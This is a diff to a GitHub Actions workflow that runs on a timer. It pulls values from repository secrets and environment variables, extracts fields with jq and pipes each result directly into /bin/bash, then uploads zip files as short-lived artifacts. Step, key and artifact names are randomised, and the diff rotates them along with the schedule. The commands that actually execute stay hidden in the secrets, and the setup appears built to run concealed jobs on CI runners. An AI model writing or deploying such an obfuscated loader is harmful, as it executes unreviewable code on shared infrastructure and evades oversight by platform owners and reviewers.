@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '4 0,6,12,18 * * *'
+    - cron: '44 4,10,16,22 * * *'
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
@@ -17,17 +17,19 @@ jobs:
           fetch-depth: 1
       - name: sessionweb888
         env:
-          ky31: ${{ secrets.ky31 }}
+          k63: ${{ secrets.k63 }}
         run: |
-          printf '%s' "$ky31" | jq -r .awdcc017 | /bin/bash
-          echo $cnven541 | jq -r .t860 | /bin/bash
-          echo $lsyrl85797 | jq -r .rwn135 | /bin/bash
-          printf '%s' "$q299" | jq -r .hug0867 | /bin/bash
+          printf '%s' "$k63" | jq -r .zeoi5631 | /bin/bash
+          echo $ki03 | jq -r .ixq2909 | /bin/bash
+          echo $kmtxy70014 | jq -r .glm76 | /bin/bash
+          echo $frbbp06 | jq -r .hwxf4645 | /bin/bash
+          echo $c25971 | jq -r .ieyxx2127 | /bin/bash
+          echo $bkcir04485 | jq -r .yoq5082 | /bin/bash
 
       - name: Upload artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: zuCHOGhq
+          name: Q0uyu9nR
           path: "*.zip"
           retention-days: 1
